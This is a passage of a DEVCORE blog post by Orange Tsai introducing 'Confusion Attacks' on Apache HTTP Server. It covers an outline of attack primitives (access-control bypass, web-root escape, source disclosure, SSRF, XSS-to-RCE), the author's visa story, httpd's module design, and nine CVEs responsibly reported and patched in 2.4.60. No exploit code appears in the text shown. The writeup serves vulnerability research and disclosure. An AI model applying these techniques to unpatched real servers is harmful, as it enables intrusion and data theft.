

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | DEVCORE 戴夫寇爾</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="這篇文章探索了 Apache HTTP Server 中存在的架構問題，介紹了數個 Httpd 的架構債，包含 3 種不同的 Confusion Attacks、9 個新漏洞、20 種攻擊手法以及超過 30 種案例分析。 包括但不限於：  1. 怎麼使用一個 ? 繞過 Httpd 內建的存取控制以及認證。 2. 不安全的 RewriteRule 怎麼跳脫 Web Root 並存取整個檔案系統。 3. 如何利用一段從 1996 遺留至今的程式碼把一個 XSS 轉化成 RCE。" />
    <meta name="keywords" content="CVE-2024-38472, CVE-2024-39573, CVE-2024-38477, CVE-2024-38476, CVE-2024-38475, CVE-2024-38474, CVE-2024-38473, CVE-2023-38709" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20240809/cover.png" />
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="這篇文章探索了 Apache HTTP Server 中存在的架構問題，介紹了數個 Httpd 的架構債，包含 3 種不同的 Confusion Attacks、9 個新漏洞、20 種攻擊手法以及超過 30 種案例分析。 包括但不限於：  1. 怎麼使用一個 ? 繞過 Httpd 內建的存取控制以及認證。 2. 不安全的 RewriteRule 怎麼跳脫 Web Root 並存取整個檔案系統。 3. 如何利用一段從 1996 遺留至今的程式碼把一個 XSS 轉化成 RCE。">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image" content="https://devco.re/assets/img/blog/20240809/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body>
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>服務<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    紅隊演練
                                </h2>
                                <p class="two-line">
                                    在不影響企業營運前提下，無所不用其極，從各種進入點執行模擬入侵攻擊，達成企業指定的演練情境。
                                </p>
                            </div>
                        </a>
                        <a href="/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    滲透測試
                                </h2>
                                <p class="two-line">
                                    以駭客思維及手法嘗試入侵企業指定系統，找出潛在漏洞，驗證企業資料與設備是否可被竊取或破壞。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    資安顧問服務
                                </h2>
                                <p class="two-line">
                                    以紅隊演練為基礎，提供攻擊者視角與可能入侵路徑，協助企業評估資安資源優先順序，並擬定長期防禦策略。
                                </p>
                            </div>
                        </a>
                        <a href="/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    資安教育訓練
                                </h2>
                                <p class="two-line">
                                    從攻擊思維出發，協助企業有效預防資安事故並防禦；以及事件發生時，如何快速判定攻擊目的、手法、漏洞與及應變方式。
                                </p>
                            </div>
                        </a>
                        <a href="https://training.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu offsec"></i>
                                    OffSec 駭客技術課程 <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    攜手全球網路安全培訓及認證商 OffSec，透過 Live Training 原廠講師實體授課及線上課程的結構化學習資源，讓資安人員的網路安全攻擊技術與時俱進。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>研究<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    總覽概要
                                </h2>
                                <p class="two-line">
                                    持續精研資安最新技術及漏洞研究趨勢，全方位檢測企業產品安全性、吸取經驗並轉化為紅隊演練工具與手法。
                                </p>
                            </div>
                        </a>
                        <a href="/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    競賽與獎項
                                </h2>
                                <p class="two-line">
                                    國際級資訊安全競賽獎項肯定。
                                </p>
                            </div>
                        </a>
                        <a href="/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    企業漏洞回報
                                </h2>
                                <p class="two-line">
                                    研究企業系統中的資安風險及各種可能的突破口，並通報企業修補。
                                </p>
                            </div>
                        </a>
                        <a href="/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    國際研討會
                                </h2>
                                <p class="two-line">
                                    參與全球資安盛會，發表、交流漏洞的知識與資訊。
                                </p>
                            </div>
                        </a>
                        <a href="/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE 漏洞列表
                                </h2>
                                <p class="two-line">
                                    挖掘並回報國際知名產品與服務的重大漏洞。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>公司<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                公司簡介
                            </h2>
                            <p>
                                DEVCORE 戴夫寇爾由世界級白帽駭客團隊創立，提供紅隊演練、滲透測試、資安顧問服務、資安教育訓練等服務。
                            </p>
                        </div>
                        </a>
                        <a href="/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    團隊成員
                                </h2>
                                <p class="two-line">
                                    由熱衷挑戰、具備駭客思維的資安專家組成，專注於創新攻擊手法研究，並以「高道德、高自律、高嚴謹」為最高指導原則。
                                </p>
                            </div>
                        </a>
                        <a href="/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    成就與沿革
                                </h2>
                                <p class="two-line">
                                    長期聚焦於攻擊研究，屢屢獲邀參與全球知名資安研討會，已揭露數百個重要產品漏洞、協助企業提升防禦能量。
                                </p>
                            </div>
                        </a>
                        <a href="/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    企業社會責任
                                </h2>
                                <p class="two-line">
                                    提供多元實習管道和研習計畫，提升新世代人才資安能量，推廣資訊安全意識。
                                </p>
                            </div>
                        </a>
                        <a href="/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    工作機會
                                </h2>
                                <p class="two-line">
                                    加入 DEVCORE，共同改善資安產業結構，與我們一起打造更安全的世界。
                                </p>
                            </div>
                        </a>
                        <a href="https://conf.devco.re/" target="_blank">
                            <div class="item">
                                <h2>
                                    <i class="icon menu conference"></i>
                                    攻擊導向技術研討會 <i class="icon open-in-new"></i>
                                </h2>
                                <p class="two-line">
                                    由 DEVCORE 舉辦的技術研討會，聚焦於技術並由駭客視角出發，帶您探索創新的攻擊技術與手法，從攻擊思考防禦的策略。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>新聞<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    DEVCORE 最新消息。
                                </p>
                            </div>
                        </a>
                        <a href="/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    媒體素材下載
                                </h2>
                                <p>
                                    使用 DEVCORE 商標須遵循的使用規範。
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/search/">搜尋</a>
            </li>
            <li>
                <a class="menuLable" href="/contact/">聯絡我們</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>服務</span>
                <div class="menuItem">
                    <a href="/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                紅隊演練
                            </h2>
                        </div>
                    </a>
                    <a href="/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                滲透測試
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                顧問服務
                            </h2>
                        </div>
                    </a>
                    <a href="/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                教育訓練
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>資安研究</span>
                <div class="menuItem">
                    <a href="/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>總覽概要</h2>
                        </div>
                    </a>
                    <a href="/research/awards/">
                        <div class="item">
                            <h2>競賽與獎項</h2>
                        </div>
                    </a>
                    <a href="/research/bug-bounty/">
                        <div class="item">
                            <h2>Bug Bounty</h2>
                        </div>
                    </a>
                    <a href="/research/talks/">
                        <div class="item">
                            <h2>國際研討會</h2>
                        </div>
                    </a>
                    <a href="/research/cve/">
                        <div class="item">
                            <h2>CVE 漏洞列表</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>公司</span>
                <div class="menuItem">
                    <a href="/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>公司簡介</h2>
                        </div>
                    </a>
                    <a href="/company/our-team/">
                        <div class="item">
                            <h2>團隊成員</h2>
                        </div>
                    </a>
                    <a href="/company/history/">
                        <div class="item">
                            <h2>成就與沿革</h2>
                        </div>
                    </a>
                    <a href="/company/csr/">
                        <div class="item">
                            <h2>企業社會責任</h2>
                        </div>
                    </a>
                    <a href="/company/jobs/">
                        <div class="item">
                            <h2>工作機會</h2>
                        </div>
                    </a>
                    <a href="https://conf.devco.re/" target="_blank">
                        <div class="item">
                            <h2>DEVCORE CONFERENCE</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>新聞</span>
                <div class="menuItem">
                    <!-- <a href="/blog/">
                    <div class="item">
                        <h2>所有文章</h2>
                    </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>案例剖析</h2>
                        </div>
                    </a> -->
                    <!-- <a href="">
                        <div class="item">
                            <h2>科普文章</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>技術專欄</h2>
                        </div>
                    </a>
                    <a href="">
                        <div class="item">
                            <h2>資安新聞</h2>
                        </div>
                    </a> -->
                    <a href="/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/media-kit/">
                        <div class="item">
                            <h2>媒體素材下載</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                搜尋
                            </h2>
                        </div>
                    </a>
                    <a href="/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                聯絡我們
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/blog/">所有文章</a>
                </li>
                <li>
                    <a href="/blog/category/最新消息/">最新消息</a>
                </li>
                <li>
                    <a href="/blog/category/技術專欄/">技術專欄</a>
                </li>
                <li>
                    <a href="/blog/category/科普文章/">科普文章</a>
                </li>
                <li>
                    <a href="/blog/category/資安新聞/">資安新聞</a>
                </li>
                <li>
                    <a href="/blog/category/學生相關計劃/">學生相關計劃</a>
                </li>
                <li>
                    <a href="/media-kit/">媒體素材下載</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                    <span class="tag">

                      <a href="/blog/tag/CVE/">#CVE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/RCE/">#RCE</a> <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/Apache/">#Apache</a> 
                    </span>
                    <h1>
                        Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/blog/author/orange">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/blog/author/orange">Orange Tsai</a></span>
                        <span class="date">2024-08-09</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20240809/cover.png"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<h6 id="orange-tsai-orange_8361--繁體中文版本--english-version">Orange Tsai (<a href="https://x.com/orange_8361">@orange_8361</a>)  |  <a href="/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/">繁體中文版本</a>  |  <a href="/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/">English Version</a></h6>

<style>
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
</style>

<p>嗨，這是我今年發表在 <a href="https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227">Black Hat USA 2024</a> 上針對 Apache HTTP Server 的研究。 此外，這份研究也將在 <a href="https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/">HITCON</a> 和 <a href="https://orangecon.nl/">OrangeCon</a> 上發表，有興趣搶先了解可點此取得投影片：</p>

<blockquote>
  <p><a href="https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></p>
</blockquote>

<p>另外也謝謝來自 Akamai 的友善聯繫！ 此份研究發表後第一時間他們也發佈了緩解措施 (詳情可參考 <a href="https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore">Akamai 的部落格</a>)。</p>

<p><br /></p>

<h2 id="tldr">TL;DR</h2>

<p>這篇文章探索了 Apache HTTP Server 中存在的架構問題，介紹了數個 Httpd 的架構債，<strong>包含 3 種不同的 Confusion Attacks、9 個新漏洞、20 種攻擊手法以及超過 30 種案例分析</strong>。 包括但不限於：</p>

<ol>
  <li>怎麼使用一個 <code class="language-plaintext highlighter-rouge">?</code> 繞過 Httpd 內建的存取控制以及認證。</li>
  <li>不安全的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 怎麼跳脫 Web Root 並存取整個檔案系統。</li>
  <li>如何利用一段從 1996 遺留至今的程式碼把一個 XSS 轉化成 RCE。</li>
</ol>

<p><br /></p>

<h2 id="大綱">大綱</h2>

<ul>
  <li><a href="#在故事之前">在故事之前</a></li>
  <li><a href="#故事是如何開始的">故事是如何開始的？</a></li>
  <li><a href="#為什麼-apache-http-server-聞起來臭臭的">為什麼 Apache HTTP Server 聞起來臭臭的？</a></li>
  <li><a href="#關於這次的新攻擊面：-confusion-attacks">關於這次的新攻擊面： Confusion Attacks</a>
    <ul>
      <li><a href="#-1-filename-confusion">1. Filename Confusion</a>
        <ul>
          <li><a href="#%ef%b8%8f-primitive-1-1-truncation">Primitive 1-1. Truncation</a>
            <ul>
              <li><a href="#%ef%b8%8f-1-1-1-path-truncation">1-1-1. Path Truncation</a></li>
              <li><a href="#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment">1-1-2. Mislead RewriteFlag Assignment</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-1-2-acl-bypass">Primitive 1-2. ACL Bypass</a></li>
        </ul>
      </li>
      <li><a href="#-2-documentroot-confusion">2. DocumentRoot Confusion</a>
        <ul>
          <li><a href="#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure">Primitive 2-1. Server-Side Source Code Disclosure</a>
            <ul>
              <li><a href="#%ef%b8%8f-2-1-1-disclose-cgi-source-code">2-1-1. Disclose CGI Source Code</a></li>
              <li><a href="#%ef%b8%8f-2-1-2-disclose-php-source-code">2-1-2. Disclose PHP Source Code</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation">Primitive 2-2. Local Gadgets Manipulation!</a>
            <ul>
              <li><a href="#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure">2-2-1. Local Gadget to Information Disclosure</a></li>
              <li><a href="#%ef%b8%8f-2-2-2-local-gadget-to-xss">2-2-2. Local Gadget to XSS</a></li>
              <li><a href="#%ef%b8%8f-2-2-3-local-gadget-to-lfi">2-2-3. Local Gadget to LFI</a></li>
              <li><a href="#%ef%b8%8f-2-2-4-local-gadget-to-ssrf">2-2-4. Local Gadget to SSRF</a></li>
              <li><a href="#%ef%b8%8f-2-2-5-local-gadget-to-rce">2-2-5. Local Gadget to RCE</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets">Primitive 2-3. Jailbreak from Local Gadgets</a>
            <ul>
              <li><a href="#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets">2-3-1. Jailbreak from Local Gadgets</a></li>
              <li><a href="#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce">2-3-2. Jailbreak Local Gadgets to Redmine RCE</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#-3-handler-confusion">3. Handler Confusion</a>
        <ul>
          <li><a href="#%ef%b8%8f-primitive-3-1-overwrite-the-handler">Primitive 3-1. Overwrite the Handler</a>
            <ul>
              <li><a href="#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code">3-1-1. Overwrite Handler to Disclose PHP Source Code</a></li>
              <li><a href="#%ef%b8%8f-3-1-2-overwrite-handler-to---">3-1-2. Overwrite Handler to ██████ ███████ ██████</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers">Primitive 3-2. Invoke Arbitrary Handlers</a>
            <ul>
              <li><a href="#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure">3-2-1. Arbitrary Handler to Information Disclosure</a></li>
              <li><a href="#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts">3-2-2. Arbitrary Handler to Misinterpret Scripts</a></li>
              <li><a href="#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf">3-2-2. Arbitrary Handler to Full SSRF</a></li>
              <li><a href="#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket">3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</a></li>
              <li><a href="#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce">3-2-4. Arbitrary Handler to RCE</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#-4-其它漏洞">4. 其它漏洞</a>
        <ul>
          <li><a href="#%ef%b8%8f-cve-2024-38472---基於-windows-unc-的-ssrf">CVE-2024-38472 - 基於 Windows UNC 的 SSRF</a>
            <ul>
              <li><a href="#%ef%b8%8f-透過-http-請求解析器觸發">透過 HTTP 請求解析器觸發</a></li>
              <li><a href="#%ef%b8%8f-透過-type-map-觸發">透過 Type-Map 觸發</a></li>
            </ul>
          </li>
          <li><a href="#%ef%b8%8f-cve-2024-39573---基於-rewriterule-前綴可完全控制的-ssrf">CVE-2024-39573 - 基於 RewriteRule 前綴可完全控制的 SSRF</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#未來研究方向">未來研究方向</a></li>
  <li><a href="#結語">結語</a></li>
</ul>

<p><br /></p>

<h2 id="在故事之前">在故事之前</h2>

<p>這裡純粹是一些個人的 Murmur，如果只對技術細節感興趣可以直接跳到 —— <a href="#故事是如何開始的">故事是如何開始的？</a></p>

<p>身為一名研究員、最大的快樂應該就是當自己的作品被同行關注並理解。所以當完成一個作品並擁有豐碩的成果後，理所當然會想要讓它被世界看到 —— 這也是為什麼我會多次在 Black Hat USA 以及 DEFCON 上分享的緣故。 在讀這篇文章的你也許知道，我從 2022 後就拿不到一個合法的簽證進入美國 (在<a href="https://esta.cbp.dhs.gov/">免簽計畫</a>中的台灣，通常只需要線上申請，數分鐘到數小時內就能取得旅行授權)，導致錯過 <a href="https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199">Black Hat USA 2022</a> 的實體演講。甚至 2023 到秘魯還有復活節島獨旅也無法從美國轉機 :(</p>

<p>為了解決這個情況，我從今年一月就開始準備 B1/B2 簽證、撰寫各式文件、到大使館面試以及漫無止盡的等待，這不是一件好玩的事，但為了讓作品被看到，還是花了非常多的時間在為了簽證奔波，以及尋求各種可能，甚至到會議開始的前三個禮拜，還不清楚發表是否會被取消 (BH 一開始只接受現場演講，不過謝謝審稿委員對這份研究的認可最終還是能透過預錄的形式發表)，所以你所看到的所有內容包含投影片、錄影以及部落格文字都是在短短數十天內完成的。 😖</p>

<p>我只是一個單純的研究員，自認問心無愧，對漏洞的態度也始終是 —— 漏洞就該讓它被廠商知道以及修復。 寫這些文字也不為了什麼，純粹紀錄下一些無奈的心情、今年所做過的努力，以及謝謝在這個過程中幫助過我的人，謝謝你們 :)</p>

<p><br /></p>

<h2 id="故事是如何開始的">故事是如何開始的？</h2>

<p>大概是在今年年初的時候，我開始思考下一個研究的目標，也許你知道我總是希望挑戰那些影響整個網際網路的大目標，所以開始尋找一些看似複雜的主題或有趣的開源專案，例如 Nginx、PHP、甚至開始看起 RFC 來強化自己對於協議實作細節的認知。</p>

<p>雖然大部分的嘗試都以失敗告終 (不過有些也許會變成下一篇部落格主題 😉)，但在細細品嘗這些程式碼時，我回憶起了曾經在去年年中短暫看過 Apache HTTP Server 原始碼這件事！ 儘管最終由於工作的時程規畫並無深入的閱讀程式碼，但在那時就已經從它的編碼風格上「聞」到了一些不太好的味道。</p>

<p>於是在今年決定繼續下去，把「為什麼聞起來怪怪的」這件事從原本只是一個說不出的「感覺」具象化，深入下去研究 Apache HTTP Server！</p>

<p><br /></p>

<h2 id="為什麼-apache-http-server-聞起來臭臭的">為什麼 Apache HTTP Server 聞起來臭臭的？</h2>

<p>首先，Apache HTTP Server 是一個由「模組們」建構起來的世界，從它<a href="https://httpd.apache.org/docs/2.4/mpm.html">官方文件</a>中也看到其對於自身模組化 (MPMs - Multi-Processing Modules) 的自豪：</p>

<blockquote>
  <p>Apache httpd has always accommodated a wide variety of environments through its modular design. […] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.</p>
</blockquote>

<p>整個 Httpd 的服務需要由數百個小模組齊心合力，共同合作才能完成客戶端的 HTTP 請求，<strong><a href="https://httpd.apache.org/docs/2.4/mod/">官方所列出的 136 個模組</a>其中約有快一半是預設啟用或經常被使用的模組</strong>！</p>

<p>而更令人驚訝的是，這麼多模組在處理客戶端 HTTP 請求的時候，彼此之間還要共同維護著一份非常巨大的 <code class="language-plaintext highlighter-rouge">request_rec</code> 結構。 這個結構包括了在處理 HTTP 時會用到的一切元素，詳細的定義可以從 <a href="https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838">include/httpd.h</a> 中找到。 所有模組都依賴這個巨大的結構去同步、溝通，甚至交換資料。 這個內部結構會像是拋接球般在所有模組間傳遞來傳遞去，每個模組都可以根據自己的喜好去隨意修改這個結構上的任意值！</p>

<p><img src="/assets/img/blog/20240809/1.png" alt="" /></p>

<p>這樣子的合作方式從軟體工程的角度來說其實不是什麼新鮮事，個體只需專心把份內事完成，只要所有人都乖乖完成自己的工作，那客戶就可以正常享受 Httpd 所提供的服務。 這樣子的分工在數個模組內可能還沒什麼問題，<strong>但如果今天把規模放大到數百個模組間的協同合作 —— 它們真的有辦法好好合作嗎？</strong> 🤔</p>

<p>所以我們的出發點很簡單 —— <strong>模組間其實並不完全了解彼此的實作細節，但卻又被要求要一起合作</strong>。 每個模組可能由不同的開發者實作，程式碼歷經多年的疊代、重整以及修改，它們真的還清楚自己在做什麼嗎？ 就算對自己瞭若指掌，那對其它模組呢？ 在缺乏一個好的開發標準或使用準則下，這中間必然會存在很多小縫隙是我們可以利用的！</p>

<p><br /></p>

<h2 id="關於這次的新攻擊面-confusion-attacks">關於這次的新攻擊面： Confusion Attacks</h2>

<p>基於前面的思考，我們開始專注在<strong>研究這些模組間的「關係」以及「交互作用」</strong>。 如果有一個模組不小心修改到了它覺得不重要但對另一個模組至關重要的結構欄位，那可能就會影響該模組的判斷。 甚至更進一步，如果 Apache HTTP Server 對這些結構的定義不夠精確，導致不同模組對同一個欄位在理解上有著根本的不一致，這都可能產生安全上的風險！</p>

<p>從這個出發點我們發展出了三種不同的攻擊，由於這些攻擊或多或少都模組對於結構欄位的誤用有關，因此把這個攻擊面命名為「Confusion Attack」，而以下是我們所發展出的攻擊：</p>

<ol>
  <li><strong>Filename Confusion</strong></li>
  <li><strong>DocumentRoot Confusion</strong></li>
  <li><strong>Handler Confusion</strong></li>
</ol>

<p>從這些攻擊出發我們找到了 9 個不同的漏洞：</p>

<ol>
  <li><strong>CVE-2024-38472</strong> - Apache HTTP Server on Windows UNC SSRF</li>
  <li><strong>CVE-2024-39573</strong> - Apache HTTP Server proxy encoding problem</li>
  <li><strong>CVE-2024-38477</strong> - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request</li>
  <li><strong>CVE-2024-38476</strong> - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect</li>
  <li><strong>CVE-2024-38475</strong> - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path</li>
  <li><strong>CVE-2024-38474</strong> - Apache HTTP Server weakness with encoded question marks in backreferences</li>
  <li><strong>CVE-2024-38473</strong> - Apache HTTP Server proxy encoding problem</li>
  <li><strong>CVE-2023-38709</strong> - Apache HTTP Server: HTTP response splitting</li>
  <li><strong>CVE-2024-??????</strong> - [redacted]</li>
</ol>

<p>這些漏洞都透過官方的安全信箱回報，並由 Apache HTTP Server 團隊在 2024-07-01 發佈安全性通報以及 2.4.60 更新 (詳細可參考<a href="https://httpd.apache.org/security/vulnerabilities_24.html">官方公告</a>)。</p>

